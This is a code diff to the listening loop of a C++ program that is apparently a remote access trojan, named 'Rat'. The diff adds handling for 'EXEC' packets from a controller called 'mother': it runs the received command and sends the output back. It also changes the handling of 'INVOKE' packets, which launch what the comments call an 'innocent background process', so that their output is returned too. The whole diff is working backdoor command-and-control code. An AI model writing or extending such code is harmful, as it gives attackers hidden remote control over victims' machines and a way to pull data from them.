@@ -100,17 +100,22 @@ void Rat::Listen() {
         RatPacket packet = recvPacket.first;
         // process packet data
         if (packet.GetType() == MsgType::EXEC) {
+            std::cout << "[*] Recv EXEC packet. . ." << std::endl;
 
+            if (UserProc::getInstance().Run(packet.GetPacketMessage())) {
+                std::string output = UserProc::getInstance().Show();
+                RatPacketUtils::Send(mother, RatPacket(output, MsgType::OUTPUT));
+            }
         } else if (packet.GetType() == MsgType::INVOKE) {
             // create innocent background process
-            std::cerr << " |__init_proc" << packet.GetPacketMessage() << std::endl;
+            std::cerr << " |__init_proc: " << packet.GetPacketMessage() << std::endl;
             bool procCreated = UserProc::getInstance().CreateBackProc(
                 packet.GetPacketMessage()
             );
 
             if (procCreated) {
-                std::this_thread::sleep_for(std::chrono::seconds(3));
-                UserProc::getInstance().Close();
+                std::string output = UserProc::getInstance().Show();
+                RatPacketUtils::Send(mother, RatPacket(output, MsgType::OUTPUT));
             } else {
                 std::cerr << "[-] Error during proc prep." << std::endl;
             }
@@ -131,5 +136,7 @@ void Rat::Listen() {
             std::cerr << "[*] Unsure how to process typeid: " <<
                 static_cast<int>(packet.GetType()) << std::endl;
         }
+    } else {
+        ratState = RatState::LOST;
     }
 }
